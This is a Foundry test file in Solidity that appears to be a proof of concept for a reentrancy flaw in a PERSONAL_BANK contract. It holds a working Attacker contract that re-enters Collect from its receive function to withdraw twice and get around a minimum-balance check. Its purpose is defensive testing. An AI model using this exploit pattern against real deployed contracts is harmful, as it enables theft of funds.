
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/PERSONAL_BANK.sol";

contract TestReentrancyPERSONAL_BANK is Test {
    PERSONAL_BANK public _contractUnderTest;
    LogFile public _logFile;
    Attacker public _attacker;

    function setUp() public {
        _logFile = new LogFile();
        _contractUnderTest = new PERSONAL_BANK();
        
        _contractUnderTest.SetLogFile(address(_logFile));
        _contractUnderTest.Initialized();
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        // MinSum is 1 ether. To demonstrate the specific vulnerability of bypassing the MinSum check
        // via reentrancy, we use a value range where sequential withdrawal would fail.
        // If we deposit 1 ether and try to withdraw 0.5 twice:
        // Sequential: 1.0 -> 0.5 (OK) -> 0.5 < 1.0 (Fail).
        // Reentrant: 1.0 -> 0.5 (OK) -> Reenter -> 1.0 -> 0.5 (OK).
        vm.assume(attackVal >= 1 ether && attackVal < 2 ether);

        // --- 3. Funding ---
        vm.deal(address(_contractUnderTest), attackVal * 2); 
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}

    fallback() external payable {}
}

contract Attacker {
    PERSONAL_BANK public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public amountToWithdraw;

    constructor(address victimAddress) { 
        victim = PERSONAL_BANK(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        // We split the deposit into two withdrawals.
        // This targets the MinSum check vulnerability.
        amountToWithdraw = val / 2;
        
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        uint256 initialBalance = address(this).balance;

        // 3. Call the vulnerable function.
        victim.Collect(amountToWithdraw);

        // 4. Verify Success Conditions.
        // If we successfully withdrew twice, our balance increases by 2 * amountToWithdraw.
        if (address(this).balance >= initialBalance + (amountToWithdraw * 2)) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 1) {            
            attackCallCount++;
            // Re-enter the contract to withdraw the second half before the balance is updated.
            // This bypasses the MinSum check which would otherwise block the second withdrawal.
            victim.Collect(amountToWithdraw);
        }
    }

    fallback() external payable {}
}
